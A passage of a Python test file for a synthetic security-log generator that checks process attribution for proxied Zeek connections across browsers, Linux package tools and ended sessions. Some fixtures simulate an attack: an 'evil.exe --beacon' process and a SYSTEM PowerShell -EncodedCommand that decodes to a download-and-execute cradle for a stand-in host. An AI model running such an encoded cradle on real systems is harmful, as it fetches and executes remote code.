                    log_formats=["zeek"],
                )
            ]
        )
        _user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        explorer = generator.state_manager.get_process(workstation.hostname, explorer_pid)
        assert explorer is not None
        request_time = datetime(2024, 1, 15, 10, 6, 0, tzinfo=UTC)
        generator.state_manager.plan_session_end(
            explorer.logon_id,
            SessionEndPlan(
                canonical_end=request_time - timedelta(minutes=1),
                authority="explicit_storyline",
                storyline_event_id="evt-browser-logoff",
            ),
        )
        proxy = generator._ip_to_system["10.0.3.10"]

        caller_image = generator._caller_explicit_proxy_process_image(
            source_system=workstation,
            pid=explorer_pid,
            process_image=explorer.image,
            time=request_time,
            proxy_context=ProxyContext(
                client_ip=workstation.ip,
                method="GET",
                url="https://example.com/",
                host="example.com",
                status_code=200,
                user_agent="Mozilla/5.0 Firefox/121.0",
                proxy_fqdn="PROXY-01.example.org",
            ),
            proxy_sys=proxy,
            dst_port=443,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                user_agent="Mozilla/5.0 Firefox/121.0",
            ),
        )

        assert caller_image is None

    def test_proxy_drops_actor_when_source_visibility_would_cross_session_end(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        explorer = generator.state_manager.get_process(workstation.hostname, explorer_pid)
        assert explorer is not None
        browser_image = r"C:\Program Files\Mozilla Firefox\firefox.exe"
        browser_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=browser_image,
            command_line=f'"{browser_image}" -osint -url https://example.com/',
            username=user.username,
            integrity_level="Medium",
            logon_id=explorer.logon_id,
        )
        request_time = datetime(2024, 1, 15, 10, 4, 0, tzinfo=UTC)
        session_end = request_time + timedelta(minutes=1)
        generator.state_manager.plan_session_end(
            explorer.logon_id,
            SessionEndPlan(
                canonical_end=session_end,
                authority="explicit_storyline",
                storyline_event_id="evt-browser-logoff",
            ),
        )
        generator._clamp_after_visible_process_create = Mock(
            return_value=session_end + timedelta(seconds=5)
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="93.184.216.34",
            time=request_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=browser_pid,
            source_system=workstation,
            hostname="example.com",
            conn_state="SF",
            process_image=browser_image,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                user_agent="Mozilla/5.0 Firefox/121.0",
                response_body_len=4000,
                status_code=200,
                status_msg="OK",
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == workstation.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
        )
        assert client_event.process is None
        assert client_event.network.initiating_pid == -1

    def test_proxy_upstream_follows_planned_request_when_client_process_is_source_delayed(
        self,
    ):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        curl_image = r"C:\Windows\System32\curl.exe"
        generator.state_manager.set_current_time(request_time - timedelta(seconds=5))
        curl_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=curl_image,
            command_line="curl.exe",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._process_source_create_times[(workstation.hostname, curl_pid)] = (
            request_time + timedelta(seconds=2)
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=192,
                cs_bytes=381,
                time_taken=900,
                user_agent="curl/8.4.0",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="93.184.216.34",
            time=request_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=curl_pid,
            source_system=workstation,
            hostname="example.com",
            conn_state="SF",
            process_image=curl_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == workstation.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        upstream_candidates = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10" and call.args[0].network.dst_port == 443
        ]
        assert upstream_candidates, [
            (
                call.args[0].network.src_ip,
                call.args[0].network.dst_ip,
                call.args[0].network.dst_port,
                call.args[0].network.service,
            )
            for call in emitters["zeek_conn"].emit.call_args_list
        ]
        upstream_event = upstream_candidates[0]

        phase_plan = client_event.protocol.proxy.transaction
        assert client_event.network.started_at == phase_plan.client_connect_at
        assert client_event.network.started_at <= phase_plan.request_at
        assert upstream_event.network.started_at == phase_plan.origin_connect_at
        assert upstream_event.network.started_at > phase_plan.request_at
        assert upstream_event.network.started_at < (phase_plan.request_at + timedelta(seconds=1))

    def test_browser_http_client_process_hint_handles_malformed_absolute_uri(self):
        generator = ActivityGenerator(StateManager(), {})

        hint = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="example.com",
            uri="http://[:::",
            dst_port=80,
        )

        assert hint is not None

    def test_proxy_origin_port_ignores_malformed_author_supplied_uri(self):
        generator = ActivityGenerator(StateManager(), {})
        oversized_port_uri = f"example.com:{'9' * 5000}"

        cases = [
            ("GET", "http://example.com:abc/", 80),
            ("GET", "http://example.com:99999/", 80),
            ("GET", "https://example.com:abc/", 443),
            ("CONNECT", oversized_port_uri, 443),
        ]

        for method, uri, expected_port in cases:
            http = HttpContext(method=method, host="example.com", uri=uri, version="1.1")

            assert generator._proxy_origin_port_from_http(http) == expected_port

    def test_direct_proxy_listener_connection_tolerates_malformed_http_uri(self):
        malformed_cases = [
            ("GET", "http://example.com:abc/"),
            ("GET", "http://example.com:99999/"),
            ("CONNECT", f"example.com:{'9' * 5000}"),
        ]

        for method, uri in malformed_cases:
            generator, emitters = _generator(
                [
                    NetworkSensor(
                        type="network",
                        name="client-tap",
                        monitoring_segments=["workstations"],
                        direction="outbound",
                        log_formats=["zeek"],
                    )
                ]
            )
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="10.0.3.10",
                time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
                dst_port=8080,
                proto="tcp",
                service="http",
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                conn_state="SF",
                http=HttpContext(
                    method=method,
                    host="example.com",
                    uri=uri,
                    version="1.1",
                    user_agent="curl/8.0",
                    status_code=200,
                ),
            )

            assert emitters["zeek_conn"].emit.called

    def test_connect_target_browser_hint_uses_origin_https_url(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="r.bing.com",
            uri="r.bing.com:443",
            dst_port=8080,
        )

        assert image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert command_line.endswith("https://r.bing.com/")
        assert ":8080/" not in command_line

    def test_connect_target_browser_hint_ignores_oversized_port_literal(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="r.bing.com",
            uri=f"r.bing.com:{'9' * 5000}",
            dst_port=8080,
        )

        assert image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert command_line.endswith("https://r.bing.com:8080/")

    def test_connect_target_browser_hint_ignores_out_of_range_port(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="r.bing.com",
            uri="r.bing.com:99999",
            dst_port=8080,
        )

        assert image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert command_line.endswith("https://r.bing.com:8080/")

    def test_opera_user_agent_does_not_map_to_chrome_process(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
            ),
            hostname="www.example.com",
            uri="/",
            dst_port=80,
        )

        assert image.endswith(r"\Opera\opera.exe")
        assert "chrome.exe" not in command_line.lower()

    def test_browser_proxy_user_agent_replaces_mismatched_browser_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        ie_image = r"C:\Program Files\Internet Explorer\iexplore.exe"
        stale_ie_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=ie_image,
            command_line=f'"{ie_image}" https://www.example.com/',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="r.bing.com:443",
                host="r.bing.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="204.79.197.200",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=stale_ie_pid,
            source_system=workstation,
            hostname="r.bing.com",
            conn_state="SF",
            process_image=ie_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != stale_ie_pid
        assert client_event.process.image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert client_event.process.command_line.endswith("https://r.bing.com/")

    def test_browser_http_repair_replaces_mismatched_browser_pid(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        ie_image = r"C:\Program Files\Internet Explorer\iexplore.exe"
        stale_ie_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=ie_image,
            command_line=f'"{ie_image}" https://www.example.com/',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        event_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        event = OccurrenceBuilder(
            timestamp=event_time,
            event_type="connection",
            src_host=HostContext(
                hostname=workstation.hostname,
                ip=workstation.ip,
                os=workstation.os,
                os_category="windows",
                system_type=workstation.type,
            ),
            network=network_plan(
                src_ip=workstation.ip,
                src_port=53077,
                dst_ip="10.0.3.10",
                dst_port=8080,
                protocol="tcp",
                initiating_pid=stale_ie_pid,
            ),
            http=HttpContext(
                method="GET",
                host="r.bing.com",
                uri="/rp/000000007fbbafbd.css",
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                status_code=200,
                response_body_len=4096,
            ),
        )

        generator._repair_browser_http_process_attribution(
            event,
            source_system=workstation,
            time=event_time,
        )

        assert event.process is not None
        assert event.process.pid != stale_ie_pid
        assert event.process.image.endswith(r"\Microsoft\Edge\Application\msedge.exe")

    def test_browser_proxy_user_agent_preserves_valid_storyline_process(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        evil_image = r"C:\Users\alex.morgan\AppData\Roaming\evil.exe"
        storyline_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=evil_image,
            command_line=r'"C:\Users\alex.morgan\AppData\Roaming\evil.exe" --beacon',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="cdn-assets-update.com:443",
                host="cdn-assets-update.com",
                status_code=200,
                sc_bytes=4800,
                cs_bytes=420,
                time_taken=1200,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/121.0.0.0 Safari/537.36"
                ),
                content_type="text/plain",
                cache_result="MISS",
                referrer="",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="45.33.32.30",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=storyline_pid,
            source_system=workstation,
            hostname="cdn-assets-update.com",
            conn_state="SF",
            process_image=evil_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == storyline_pid
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.username == user.username
        assert client_event.process.image == evil_image

    def test_matching_caller_proxy_process_is_preserved_for_storyline_download(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        powershell_image = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 58, 0, tzinfo=UTC))
        stale_user_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=powershell_image,
            command_line=(
                "powershell.exe -NoProfile -Command "
                "\"Invoke-WebRequest -Proxy 'http://PROXY-01.example.org:8080' "
                "-Uri 'https://cdn-assets-update.com/' -UseBasicParsing\""
            ),
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        storyline_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=4,
            image=powershell_image,
            command_line=(
                "powershell.exe -NoProfile -EncodedCommand "
                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp"
                "AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AH"
                "AAcwA6AC8ALwBjAGQAbgAtAGEAcwBzAGUAdABzAC0AdQBwAGQAYQB0AGUALgBjAG8A"
                "bQAvAGgAZQBhAGwAdABoAC4AcABzADEAIgApAA=="
            ),
            username="SYSTEM",
            integrity_level="System",
            logon_id="0x3e7",
        )
        assert stale_user_pid != storyline_pid
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://cdn-assets-update.com/health.ps1",
                host="cdn-assets-update.com",
                status_code=200,
                sc_bytes=4800,
                cs_bytes=420,
                time_taken=1200,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
                content_type="text/plain",
                cache_result="MISS",
                referrer="",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="45.33.32.30",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=storyline_pid,
            source_system=workstation,
            hostname="cdn-assets-update.com",
            conn_state="SF",
            process_image=powershell_image,
            http=HttpContext(
                method="GET",
                host="cdn-assets-update.com",
                uri="/health.ps1",
                version="1.1",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["text/plain"],
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == storyline_pid
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.username == "SYSTEM"
        assert client_event.process.command_line.endswith("AA==")

    def test_browser_proxy_user_agent_replaces_unrelated_chat_app_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        slack_image = r"C:\Users\alex.morgan\AppData\Local\slack\slack.exe"
        slack_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=slack_image,
            command_line="slack.exe",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="r.bing.com:443",
                host="r.bing.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="204.79.197.200",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=slack_pid,
            source_system=workstation,
            hostname="r.bing.com",
            conn_state="SF",
            process_image=slack_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != slack_pid
        assert client_event.process.image.endswith(r"\Microsoft\Edge\Application\msedge.exe")

    def test_browser_proxy_user_agent_replaces_unrelated_dropbox_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        dropbox_image = r"C:\Program Files (x86)\Dropbox\Client\Dropbox.exe"
        dropbox_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=dropbox_image,
            command_line=r'"C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" /systemstartup',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="www.github.com:443",
                host="www.github.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="140.82.112.4",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=dropbox_pid,
            source_system=workstation,
            hostname="www.github.com",
            conn_state="SF",
            process_image=dropbox_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != dropbox_pid
        assert client_event.process.image.endswith(r"\Google\Chrome\Application\chrome.exe")

    def test_linux_package_proxy_user_agent_replaces_unrelated_git_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        git_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=shell_pid,
            image="/usr/bin/git",
            command_line="git status",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="changelogs.ubuntu.com:443",
                host="changelogs.ubuntu.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent="apt-http/2.4.11 (amd64)",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip="91.189.91.48",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=git_pid,
            source_system=linux_system,
            hostname="changelogs.ubuntu.com",
            conn_state="SF",
            process_image="/usr/bin/git",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != git_pid
        assert client_event.process.image == "/usr/lib/apt/methods/https"
        assert client_event.process.command_line == "/usr/lib/apt/methods/https"
        assert client_event.process.username == "root"
        assert client_event.process.logon_id != user_session.logon_id

    def test_linux_package_proxy_client_uses_system_owner_after_session_logout(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        shell_proc = generator.state_manager.get_process(linux_system.hostname, shell_pid)
        assert shell_proc is not None
        logon_id = shell_proc.logon_id
        request_time = datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC)
        generator.state_manager.end_session(
            logon_id,
            request_time - timedelta(seconds=30),
        )
        proxy = generator._ip_to_system["10.0.3.10"]

        pid, image = generator._ensure_explicit_proxy_client_process(
            source_system=linux_system,
            time=request_time,
            proxy_context=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="changelogs.ubuntu.com:443",
                host="changelogs.ubuntu.com",
                status_code=200,
                user_agent="apt-http/2.4.11 (amd64)",
                proxy_fqdn="PROXY-01.example.org",
            ),
            proxy_sys=proxy,
            dst_port=443,
        )

        proc = generator.state_manager.get_process(linux_system.hostname, pid)
        assert image == "/usr/lib/apt/methods/https"
        assert proc is not None
        assert proc.username == "root"
        assert proc.logon_id != logon_id
        assert proc.parent_pid != shell_pid
        parent = generator.state_manager.get_process(linux_system.hostname, proc.parent_pid)
        assert parent is not None
        assert parent.image == "/usr/bin/apt-get"
        assert parent.start_time < proc.start_time
        grandparent = generator.state_manager.get_process(
            linux_system.hostname,
            parent.parent_pid,
        )
        assert grandparent is not None
        assert grandparent.image == "/usr/lib/systemd/systemd"

    def test_linux_background_helper_process_drops_ended_user_session_parent(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        shell_proc = generator.state_manager.get_process(linux_system.hostname, shell_pid)
        assert shell_proc is not None
        systemd_pid = shell_proc.parent_pid
        logon_id = shell_proc.logon_id
        request_time = datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC)
        generator.state_manager.end_session(
            logon_id,
            request_time - timedelta(seconds=30),
        )

        pid = generator.generate_process(
            user=user,
            system=linux_system,
            time=request_time,
            logon_id=logon_id,
            process_name="/usr/lib/apt/methods/https",
            command_line="/usr/lib/apt/methods/https",
            parent_pid=shell_pid,
            suppress_command_file_effect=True,
        )

        proc = generator.state_manager.get_process(linux_system.hostname, pid)
        assert proc is not None
        assert proc.username == "root"
        assert proc.logon_id == "0x3e7"
        assert proc.parent_pid == systemd_pid

    def test_linux_proxy_replaces_bad_caller_with_tool_owner(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        linux_system = System(
            hostname="LINUX-APP-01",
            ip="10.0.1.10",
            os="Ubuntu 24.04",
            type="server",
        )
        generator._ip_to_system[linux_system.ip] = linux_system
        generator._proxy_routes[linux_system.ip] = [generator._ip_to_system["10.0.3.10"]]
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 55, 0, tzinfo=UTC))
        systemd_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=0,
            image="/usr/lib/systemd/systemd",
            command_line="/usr/lib/systemd/systemd",
            username="root",
            integrity_level="System",
        )
        bash_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=systemd_pid,
            image="/bin/bash",
            command_line="-bash",
            username="root",
            integrity_level="Medium",
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent="curl/8.4.0",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=bash_pid,
            source_system=linux_system,
            hostname="example.com",
            conn_state="SF",
            process_image="/bin/bash",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
